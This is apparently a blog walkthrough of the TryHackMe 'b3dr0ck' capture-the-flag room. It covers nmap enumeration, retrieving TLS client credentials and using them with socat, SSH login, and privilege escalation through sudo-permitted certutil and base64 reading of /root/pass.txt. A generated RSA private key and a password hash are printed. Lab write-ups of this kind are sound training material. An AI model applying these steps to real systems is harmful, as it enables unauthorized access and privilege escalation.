---
title: Walkthrough - b3dr0ck
published: true
---

Tags: CTF, TLS, socat, sockets.
Description: Server trouble in Bedrock.
Difficulty: Easy
URL: [https://tryhackme.com/room/b3dr0ck](https://tryhackme.com/room/b3dr0ck)

* * *

## Notes

> Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...
> - He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
> - There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
> - There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
> - Can you find all the Easter eggs?

Step one perform initial nmap scan `sudo nmap -Pn -sS -T4 -p- 10.10.77.166 -vvv` then enumerate further `sudo nmap -sC -sV -sT -Pn -O 10.10.77.166 -p22,80,4040,9009,54321`

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.77.166:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-08-30T15:55:13
|_Not valid after:  2023-08-30T15:55:13
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings:
|   NULL:
 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|

|_    What are you looking for?
54321/tcp open  ssl/unknown
```

Port 9009 we can ask for a cert and a private key and it will be given. The service is the TCP socket that was listening with the simple service for us to retrieve the TLS credential files. Now we have to find the other TCP (TLS) helper service listening for authorized connections using these files we obtained.

Going back into the 9009 service and asking for help gets us another hint using this command we can connect to the service on 54321. `socat stdio ssl:10.10.77.166:54321,cert=9009.cert,key=9009.rsa,verify=0`

```

 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'Barney Rubble' is authorized.
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

* * * 

## What is the barney.txt flag?

We can SSH into the server with the above credentials and get barneys flag.

![0xskar](/assets/b3dr0ck01.png)

```
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

```
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:~$ sudo /usr/bin/certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Aug 30 15:55 barney.certificate.pem
-rw-r----- 1 root root 1674 Aug 30 15:55 barney.clientKey.pem
-rw-r----- 1 root root  894 Aug 30 15:55 barney.csr.pem
-rw-r----- 1 root root 1678 Aug 30 15:55 barney.serviceKey.pem
-rw-r----- 1 root root  976 Aug 30 15:55 fred.certificate.pem
-rw-r----- 1 root root 1674 Aug 30 15:55 fred.clientKey.pem
-rw-r----- 1 root root  898 Aug 30 15:55 fred.csr.pem
-rw-r----- 1 root root 1678 Aug 30 15:55 fred.serviceKey.pem
```

```
sudo /usr/bin/certutil fred fredflinstone
Generating credentials for user: fred (fredflinstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6iiIBfgI4xvK3xVnhO1RmhM1hxjc/LDL8S3IN8RcnKvf9qiR
9NAOibBqHbQoYTWDHezR3oCWwEdU7EpLXiiD//qKoo0/+61mRnHXz8w8x5zYc5BT
aVN93AEzgJupfcOCR0fhTEfBzNQ8TfNHI59xQY8/R2prVJbD3QBiEmeNqt4bk8MF
MxaZGW02ZthkRig5VwSun/8WuJO2jSUHmPaetAoucdKnrg1KiYVeT2D3mayY15MX
vFz2Kd4n5j4cJj7hkTCWKtWUG4FKLyp92SRXvtszMsJtf/yEaUTVGDU7lLd1SIwM
OuBNR0Se2/xD2tpZqYLi5GUoDa9XglKqyl+A5QIDAQABAoIBADQbgOmTIKcpcCPk
p3y1MwuOasL9jW/OCBRLk9qVH+bdeKFzMcfA5PtO/s5NYQ8A0YS/RpS1GNcBCKzs
e4kgiv9TybYSqMJg+/mBK/1Z/cyN4r0UyPsPUVq8CbH88eLCtyMVo9VNwprKQAE4
ugP7X0Cvl+1UiT3xrvRnOWvPD3+OMKvbMX46/AmmGs9LLpyv0vOKj1q3yA3tKZSk
El5vXB80oke05h18tvBpPFGkoJPnUUkOjKCsx/bF4arEzLSpRDIMbBwf4SGYPfk3
VBLDgW539CUPkOLQjDP8cNrUYW3gVREITGuFguCLbWJ//Gj6wO2udAb5eo6pv7p0
U+KAnqECgYEA9vCydahMcWXDqQJH7AMOysuNhMMpGDnzpZTclMHKF0qyCS0NdiJp
cZniiQ3hC7JE3Dosl8CfItMFie/1UbUb0SEWDLPe8mGAOd8XltNKiJjFna6TEc+1
gbkuO+A7Zo1yjoYFO/9KCRBt/YT5b5GhKXet7KI8IOTVQAwPDEVF1OcCgYEA8r/I
2T3lo55HmIhErOzDfw5jT/dkVt0um/Y3wUuy36AZEUBucoWNTR7RF1jLStLnk1KO
JCg7f00N1NuhRQKD8cQ1iA0CwbffpkOfhK/GoykCTK/K/P+YDfugjdtXkC3bG4lr
MZ9ltN8ZyoWJ8KKwzJ+oRqDaOJZzU6G5v4p/dlMCgYBCcqRi2qWvQeXzfYSi8nOx
iDKNjgJp3XY9kSAF+1uJBvV/WJsttbbP9cuqe4yaHB9Bb3n+X7uyoDv2URafJO/W
R2PqiSAt8qSRbgGn+TUuKoXKl2ZFvbGmtZDGVeFGCDvSNCgGa/ydEcm3FWgVaIeI
ZAbuDP3HECx97oDCGYXf8wKBgQDXPkUak+7OQOedEZ9Lcfj67UgUPPnEqATPF+hi
RfwKnAv+JxKIC3G6Y0vllr9TzmS2VephlycCftF333NFHLDgLCmHRHogSSlPZQDK
B45rWE6IrwufgAdUxrybbFVdK7vv086vxnXJhlV5JSWlsKxyFFOCpNg6evUxv+JT
O7w/rwKBgHn/eV2jiqJISerDABd7RcHhIClNcNZJsgVm5Vq26OnMwRDeQuu9yhux
QlQPJnT24MF1lZtWLGMyCfHcULC6pUzNMVH42v8SOxghmUpSpxbuRhBWDhPvwLgh
G4sf3uOyIl5n/X+CB5LKK4si8+cbuiX5AGqfKE328PlhsdgnLtO7
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MzAxNjU2MjVaFw0yMjA4MzExNjU2MjVaMBgxFjAUBgNVBAMMDWZy
ZWRmbGluc3RvbmUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqKIgF
+AjjG8rfFWeE7VGaEzWHGNz8sMvxLcg3xFycq9/2qJH00A6JsGodtChhNYMd7NHe
gJbAR1TsSkteKIP/+oqijT/7rWZGcdfPzDzHnNhzkFNpU33cATOAm6l9w4JHR+FM
R8HM1DxN80cjn3FBjz9HamtUlsPdAGISZ42q3huTwwUzFpkZbTZm2GRGKDlXBK6f
/xa4k7aNJQeY9p60Ci5x0qeuDUqJhV5PYPeZrJjXkxe8XPYp3ifmPhwmPuGRMJYq
1ZQbgUovKn3ZJFe+2zMywm1//IRpRNUYNTuUt3VIjAw64E1HRJ7b/EPa2lmpguLk
ZSgNr1eCUqrKX4DlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHO163Qf3drbAeD6
bESefzUllv1Cqgs5vo/Ku4TuiZLAnpHnL9HUHaE29V/3vqJXyc/vzxxdBXqgjfq5
J1letQ5U56D0AJJhH114hh4RKe4EHn83Bl9E/AZ9hETTpDQ3N4a9sDs2/4B/hl8U
ZB3nzAnZQsESCjUWInjiqq8m6HoluJY8lO24jJ007Hbgw5+BGj496niufOvOf2df
8AX6P66idebbFgjLiM5rmo5hFQW0kBiEJy0b+E/nUGtJvabgePHBoQ4BC9NjaqIH
3+HVMnjmFUmN1/Sy3cEz0qWrmwFFQo+0VVi6Lx4a8EHck241VJ0+K7zLVysDgvov
mBJmhsM=
-----END CERTIFICATE-----
```

* * * 

## What is fred's password?

- We can use the above certs to socat into the 54321 and get freds password.

* * * 

## What is the fred.txt flag?

![0xskar](/assets/b3dr0ck02.png)

* * * 

## What is the root.txt flag?

```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

Decode from base64 to base32 to md5 and throw it at crackstation to get root password then su

![0xskar](/assets/b3dr0ck03.png)

* * * 